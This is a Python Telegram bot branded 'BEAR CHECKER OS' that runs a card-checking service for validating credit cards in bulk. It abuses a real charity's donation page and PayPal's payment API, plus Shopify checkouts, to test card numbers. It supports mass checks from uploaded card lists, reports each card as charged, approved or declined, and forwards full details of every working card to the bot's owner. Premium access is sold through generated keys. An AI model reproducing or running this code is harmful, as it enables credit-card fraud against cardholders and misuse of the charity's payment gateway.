```python
import asyncio
import os
import secrets
import string
import json
import time
import hashlib
import requests
import re
import base64
import urllib3
urllib3.disable_warnings()
from datetime import datetime, timedelta

from aiogram import Bot, Dispatcher, Router, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
from aiogram.exceptions import TelegramBadRequest

from requests_toolbelt.multipart.encoder import MultipartEncoder
from user_agent import generate_user_agent

# --- INTEGRATING YOUR FILES ---
# These must exist in your GitHub repository
try:
    from api import process_card_async, parse_cc_string, extract_clean_response
    from shopify import get_bin_info, classify_result, approved_message, fmt_price, fmt_info
except ImportError:
    print("CRITICAL: api.py or shopify.py missing from repository!")

# --- CONFIGURATION ---
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = os.getenv("ADMIN_ID") # Your numeric Telegram ID

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

# --- DATABASE PATHS ---
PREMIUM_FILE = "premium.json"
KEYS_FILE = "keys.json"
USAGE_FILE = "usage.json"
ACTIVE_JOBS = {} 

# --- DATABASE LOGIC ---
def load_db(filename):
    if os.path.exists(filename):
        try:
            with open(filename, "r") as f: return json.load(f)
        except: return {}
    return {}

def save_db(filename, data):
    with open(filename, "w") as f: json.dump(data, f, indent=4)

def check_tier(user_id):
    if str(user_id) == str(ADMIN_ID): return "👑 ADMIN"
    db = load_db(PREMIUM_FILE)
    if str(user_id) in db:
        expiry = datetime.fromisoformat(db[str(user_id)])
        if datetime.now() < expiry: return "🔑 PREMIUM"
        else:
            del db[str(user_id)]
            save_db(PREMIUM_FILE, db)
    return "🆓 FREE"

def get_usage(user_id):
    db = load_db(USAGE_FILE)
    today = datetime.now().strftime("%Y-%m-%d")
    uid = str(user_id)
    if uid not in db or db[uid].get("date") != today:
        db[uid] = {"date": today, "single": 0, "mass": 0}
        save_db(USAGE_FILE, db)
    return db[uid]

def add_usage(user_id, check_type):
    db = load_db(USAGE_FILE)
    uid = str(user_id)
    today = datetime.now().strftime("%Y-%m-%d")
    if uid not in db or db[uid].get("date") != today:
        db[uid] = {"date": today, "single": 0, "mass": 0}
    db[uid][check_type] += 1
    save_db(USAGE_FILE, db)

# --- FINITE STATE MACHINE ---
class AppStates(StatesGroup):
    waiting_for_shopify = State()
    waiting_for_shopify_mass = State()
    waiting_for_paypal = State()
    waiting_for_paypal_mass = State()
    waiting_for_key = State()
    waiting_for_bulk_count = State()

# --- PAYPAL ENGINE (Restored) ---
def check_cc_paypal(ccx):
    try:
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) < 4: return "ERROR", "Invalid CC Format"
        n, mm, yy, cvc = parts[0], parts[1].zfill(2), parts[2][-2:], parts[3].strip()
        us = generate_user_agent()
        session = requests.Session()
        session.verify = False
        with session as r:
            res = r.get('https://www.rarediseasesinternational.org/donate/', headers={'user-agent': us}, timeout=10)
            m4 = re.search(r'"data-client-token":"(.*?)"', res.text)
            if not m4: return "ERROR", "Gateway Token Error"
            dec = base64.b64decode(m4.group(1)).decode('utf-8')
            au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
            tok = r.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php', params={'action': 'give_paypal_commerce_create_order'}, data={'action': 'give_paypal_commerce_create_order'}, timeout=10).json()['data']['id']
            headers_p = {'authorization': f'Bearer {au}', 'content-type': 'application/json', 'user-agent': us}
            json_p = {'payment_source': {'card': {'number': n, 'expiry': f'20{yy}-{mm}', 'security_code': cvc}}}
            r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=headers_p, json=json_p, timeout=12, verify=False)
            final_res = r.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php', params={'action': 'give_paypal_commerce_approve_order', 'order': tok}, timeout=12).text.upper()
            if any(k in final_res for k in ['APPROVED', 'THANKS', '"SUCCESS":TRUE']): return "CHARGED", "Approved"
            if 'INSUFFICIENT_FUNDS' in final_res: return "APPROVED", "Low Funds"
            return "DECLINED", "Card Declined"
    except Exception as e: return "ERROR", f"Error: {str(e)[:15]}"

# --- OWNER NOTIFICATION ---
async def notify_hit(user, status, cc, bin_info):
    brand, bank, country, level, type_cc, flag = bin_info
    text = (
        f"🔥 <b>NEW HIT DETECTED</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>User:</b> {user.first_name} (<code>{user.id}</code>)\n"
        f"💎 <b>Status:</b> {status}\n"
        f"💳 <b>Card:</b> <code>{cc}</code>\n"
        f"🏦 <b>Bank:</b> {bank}\n"
        f"🌍 <b>Country:</b> {country} {flag}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )
    try: await bot.send_message(ADMIN_ID, text)
    except: pass

# --- UI KEYBOARDS ---
def kb_home(user_id):
    is_admin = str(user_id) == str(ADMIN_ID)
    kb = [
        [InlineKeyboardButton(text="🟢 Shopify Gateway", callback_data="menu_shopify"),
         InlineKeyboardButton(text="🔵 PayPal Gateway", callback_data="menu_paypal")],
        [InlineKeyboardButton(text="👤 Profile", callback_data="ui_plan"),
         InlineKeyboardButton(text="🔑 Redeem", callback_data="ui_redeem")]
    ]
    if is_admin: kb.append([InlineKeyboardButton(text="⚙️ Admin Control", callback_data="ui_admin")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def kb_gateway(g_type):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💳 Single Check", callback_data=f"single_{g_type}"),
         InlineKeyboardButton(text="📁 Mass Check", callback_data=f"mass_{g_type}")],
        [InlineKeyboardButton(text="🔙 Back to Hub", callback_data="ui_home")]
    ])

def format_mass_stats(job_id, gateway, checked, total, approved, charged, declined, errors, start_time, tier):
    elapsed = max(time.time() - start_time, 0.1)
    speed = checked / elapsed
    hit_rate = ((approved + charged) / checked * 100) if checked > 0 else 0
    status_icon = "🏁" if checked == total else "⏳"
    return (
        f"<code>"
        f" {status_icon} MSTXT - {'COMPLETE' if checked == total else 'RUNNING'}\n"
        f" ━━━━━━━━━━━━━━━━━━━━━\n"
        f" 📦 Total    : {total}\n"
        f" ✅ Approved : {approved + charged}\n"
        f" ❌ Declined : {declined}\n"
        f" ⚠️ Errors   : {errors}\n"
        f" 📈 Hit Rate : {hit_rate:.1f}%\n"
        f" ⚡️ Speed    : {speed:.1f} c/s\n"
        f" ⏱ Time     : {elapsed:.1f}s\n"
        f" ━━━━━━━━━━━━━━━━━━━━━\n"
        f" 🔑 Tier     : {tier}\n"
        f" BY BEAR OS\n"
        f"</code>"
    )

# --- BASE HANDLERS ---
@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    try: await message.delete()
    except: pass
    data = await state.get_data()
    if data.get("dash_id"):
        try: await bot.delete_message(message.chat.id, data.get("dash_id"))
        except: pass
    await state.clear()
    tier = check_tier(message.from_user.id)
    text = (f"⚡️ <b>BEAR CHECKER OS</b> ⚡️\n━━━━━━━━━━━━━━━━━━\n\n"
            f"Welcome, <b>{message.from_user.first_name}</b>.\nTier: {tier}\n\n<i>Select Gateway:</i>")
    msg = await message.answer(text, reply_markup=kb_home(message.from_user.id))
    await state.update_data(dash_id=msg.message_id)

@router.callback_query(F.data == "ui_home")
async def nav_home(c: CallbackQuery, state: FSMContext):
    dash_id = (await state.get_data()).get("dash_id")
    await state.clear()
    if dash_id: await state.update_data(dash_id=dash_id)
    await c.message.edit_text(f"⚡️ <b>BEAR CHECKER OS</b> ⚡️\n━━━━━━━━━━━━━━━━━━\n\nTier: {check_tier(c.from_user.id)}", reply_markup=kb_home(c.from_user.id))

@router.callback_query(F.data.startswith("menu_"))
async def nav_gateway(c: CallbackQuery):
    gway = c.data.split("_")[1]
    await c.message.edit_text(f"🛠 <b>{gway.upper()} HUB</b>", reply_markup=kb_gateway(gway))

# --- INPUT TRIGGERS ---
@router.callback_query(F.data.startswith("single_"))
async def single_trigger(c: CallbackQuery, state: FSMContext):
    gway = c.data.split("_")[1]
    usage = get_usage(c.from_user.id)
    if check_tier(c.from_user.id) == "🆓 FREE" and usage['single'] >= 10:
        return await c.answer("⛔️ Daily Limit Reached (10)", show_alert=True)
    await c.message.edit_text(f"💳 <b>{gway.upper()} SINGLE</b>\nPaste Card: <code>CC|MM|YYYY|CVV</code>", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]]))
    await state.set_state(AppStates.waiting_for_shopify if gway == "shopify" else AppStates.waiting_for_paypal)

@router.callback_query(F.data.startswith("mass_"))
async def mass_trigger(c: CallbackQuery, state: FSMContext):
    gway = c.data.split("_")[1]
    usage = get_usage(c.from_user.id)
    if check_tier(c.from_user.id) == "🆓 FREE" and usage['mass'] >= 1:
        return await c.answer("⛔️ Daily Mass Limit Reached (1)", show_alert=True)
    await c.message.edit_text(f"📁 <b>{gway.upper()} MASS</b>\nUpload <code>.txt</code> file:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]]))
    await state.set_state(AppStates.waiting_for_shopify_mass if gway == "shopify" else AppStates.waiting_for_paypal_mass)

# --- SINGLE PROCESSING ---
@router.message(AppStates.waiting_for_shopify)
@router.message(AppStates.waiting_for_paypal)
async def proc_single(message: Message, state: FSMContext):
    g_type = "shopify" if await state.get_state() == AppStates.waiting_for_shopify else "paypal"
    cc = message.text.strip()
    try: await message.delete()
    except: pass
    
    dash_id = (await state.get_data()).get("dash_id")
    loading = await bot.edit_message_text(f"⏳ <b>AUTHORIZING...</b>\nTarget: <code>{cc}</code>", message.chat.id, dash_id)
    
    try:
        if g_type == "shopify":
            parts = parse_cc_string(cc)
            success, raw, g_name, p, c = await process_card_async(parts['cc'], parts['mes'], parts['ano'], parts['cvv'], "https://shop.spam.com")
            status = classify_result(success, raw).upper()
            resp = extract_clean_response(raw)
            bin_cc = parts['cc']
        else:
            status, resp = await asyncio.to_thread(check_cc_paypal, cc)
            bin_cc = cc.split('|')[0]
            g_name = "PayPal Braintree"

        async with aiohttp.ClientSession() as s: bin_data = await get_bin_info(s, bin_cc[:6])
        add_usage(message.from_user.id, "single")
        
        emoji = "🔥 𝐂𝐇𝐀𝐑𝐆𝐄𝐃" if status == "CHARGED" else "✅ 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃" if status == "APPROVED" else "❌ 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃"
        res_text = (f"<b>{emoji}</b>\n━━━━━━━━━━━━━\n💳 <b>Card:</b> <code>{cc}</code>\nツ <b>Res:</b> <code>{resp}</code>\n"
                    f"キ <b>Gate:</b> {g_name}\n━━━━━━━━━━━━━\n零 <b>Info:</b> <code>{bin_data[0]} - {bin_data[4]}</code>\n"
                    f"零 <b>Bank:</b> <code>{bin_data[1]}</code>\n零 <b>Country:</b> <code>{bin_data[2]} {bin_data[5]}</code>\n━━━━━━━━━━━━━\n<i>BY BEAR OS</i>")
        await loading.edit_text(res_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]]))
        if status in ["CHARGED", "APPROVED"]: await notify_hit(message.from_user, status, cc, bin_data)
    except: await loading.edit_text("❌ <b>Format Error.</b> Try Again.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]]))
    await state.clear(); await state.update_data(dash_id=dash_id)

# --- MASS PROCESSING ---
@router.message(AppStates.waiting_for_shopify_mass, F.document)
@router.message(AppStates.waiting_for_paypal_mass, F.document)
async def proc_mass(message: Message, state: FSMContext):
    g_type = "shopify" if await state.get_state() == AppStates.waiting_for_shopify_mass else "paypal"
    try: await message.delete()
    except: pass
    
    dash_id = (await state.get_data()).get("dash_id")
    file_info = await bot.get_file(message.document.file_id)
    downloaded = await bot.download_file(file_info.file_path)
    ccs = [l.strip() for l in downloaded.read().decode('utf-8').splitlines() if l.strip()]
    
    tier = check_tier(message.from_user.id)
    if tier == "🆓 FREE": ccs = ccs[:30]
    
    add_usage(message.from_user.id, "mass")
    job_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:6].upper()
    ACTIVE_JOBS[job_id] = True
    total, start_time = len(ccs), time.time()
    prog_msg = await bot.edit_message_text(format_mass_stats(job_id, g_type.upper(), 0, total, 0, 0, 0, 0, start_time, tier), message.chat.id, dash_id)
    
    checked, approved, charged, declined, errors = 0, 0, 0, 0, 0
    
    async def task(cc):
        nonlocal checked, approved, charged, declined, errors
        if not ACTIVE_JOBS.get(job_id): return
        try:
            if g_type == "shopify":
                parts = parse_cc_string(cc); s_res, raw, g, p, c = await process_card_async(parts['cc'], parts['mes'], parts['ano'], parts['cvv'], "https://shop.spam.com")
                status = classify_result(s_res, raw).upper(); bin_cc = parts['cc']
            else:
                status, resp = await asyncio.to_thread(check_cc_paypal, cc); bin_cc = cc.split('|')[0]
            checked += 1
            if status == "CHARGED": charged += 1
            elif status == "APPROVED": approved += 1
            elif status == "DECLINED": declined += 1
            else: errors += 1
            if status in ["CHARGED", "APPROVED"]:
                async with aiohttp.ClientSession() as s: b_d = await get_bin_info(s, bin_cc[:6])
                await message.answer(f"{'🔥' if status == 'CHARGED' else '✅'} <b>HIT:</b> <code>{cc}</code>"); await notify_hit(message.from_user, status, cc, b_d)
        except: checked += 1; errors += 1

    sem = asyncio.Semaphore(5)
    async def sem_task(cc):
        async with sem: await task(cc)

    for i, cc in enumerate(ccs):
        if not ACTIVE_JOBS.get(job_id): break
        asyncio.create_task(sem_task(cc))
        if i % 10 == 0:
            await asyncio.sleep(0.5); await prog_msg.edit_text(format_mass_stats(job_id, g_type.upper(), checked, total, approved, charged, declined, errors, start_time, tier))

    await prog_msg.edit_text(format_mass_stats(job_id, g_type.upper(), checked, total, approved, charged, declined, errors, start_time, tier), reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Hub", callback_data="ui_home")]]))
    await state.clear(); await state.update_data(dash_id=dash_id)

# --- ADMIN PANEL ---
@router.callback_query(F.data == "ui_admin")
async def nav_admin(c: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🎟 Bulk Key Gen", callback_data="admin_bulk")], [InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]])
    await c.message.edit_text("⚙️ <b>ADMIN CONTROL</b>", reply_markup=kb)

@router.callback_query(F.data == "admin_bulk")
async def bulk_count(c: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"{n} Keys", callback_data=f"blkcnt_{n}") for n in [10, 20, 30]], [InlineKeyboardButton(text="🔙 Cancel", callback_data="ui_home")]])
    await c.message.edit_text("🔢 <b>Select Quantity:</b>", reply_markup=kb)

@router.callback_query(F.data.startswith("blkcnt_"))
async def bulk_dur(c: CallbackQuery, state: FSMContext):
    await state.update_data(bulk_count=int(c.data.split("_")[1]))
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"{d} Days", callback_data=f"blkdur_{d}d") for d in [1, 2, 5, 7]], [InlineKeyboardButton(text="🔙 Cancel", callback_data="ui_home")]])
    await c.message.edit_text("⏳ <b>Select Duration:</b>", reply_markup=kb)

@router.callback_query(F.data.startswith("blkdur_"))
async def bulk_finish(c: CallbackQuery, state: FSMContext):
    data = await state.get_data(); count, dur = data['bulk_count'], c.data.split("_")[1]
    db = load_db(KEYS_FILE); keys = []
    for _ in range(count):
        k = "BEAR-" + "".join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(12))
        db[k] = dur; keys.append(f"<code>{k}</code>")
    save_db(KEYS_FILE, db)
    await c.message.edit_text(f"✅ <b>{count} Keys Generated ({dur}):</b>\n\n" + "\n".join(keys), reply_markup=kb_home(c.from_user.id))
    await state.clear(); await state.update_data(dash_id=c.message.message_id)

# --- KEY REDEEM ---
@router.callback_query(F.data == "ui_redeem")
async def nav_redeem(c: CallbackQuery, state: FSMContext):
    await c.message.edit_text("🔑 <b>KEY REDEMPTION</b>\nPaste key below:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]]))
    await state.set_state(AppStates.waiting_for_key)

@router.message(AppStates.waiting_for_key)
async def proc_key(m: Message, state: FSMContext):
    k_in = m.text.strip().upper(); db = load_db(KEYS_FILE)
    try: await m.delete()
    except: pass
    if k_in in db:
        dur_str = db[k_in]
        days = int(dur_str[:-1]); expiry = datetime.now() + timedelta(days=days)
        prem = load_db(PREMIUM_FILE); prem[str(m.from_user.id)] = expiry.isoformat()
        save_db(PREMIUM_FILE, prem); del db[k_in]; save_db(KEYS_FILE, db)
        await m.answer("🎉 <b>Success! Premium Activated.</b>")
        await cmd_start(m, state)
    else: await m.answer("❌ Invalid Key")

@router.callback_query(F.data == "ui_plan")
async def nav_plan(c: CallbackQuery):
    tier = check_tier(c.from_user.id)
    usage = get_usage(c.from_user.id)
    text = (f"👤 <b>USER PROFILE</b>\n━━━━━━━━━━━━━\n<b>ID:</b> <code>{c.from_user.id}</code>\n"
            f"<b>Tier:</b> {tier}\n")
    if tier == "🆓 FREE":
        text += f"<b>Single Checks:</b> {usage['single']}/10\n<b>Mass Checks:</b> {usage['mass']}/1\n"
    await c.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="ui_home")]]))

async def main(): await dp.start_polling(bot)
if __name__ == "__main__": asyncio.run(main())

```
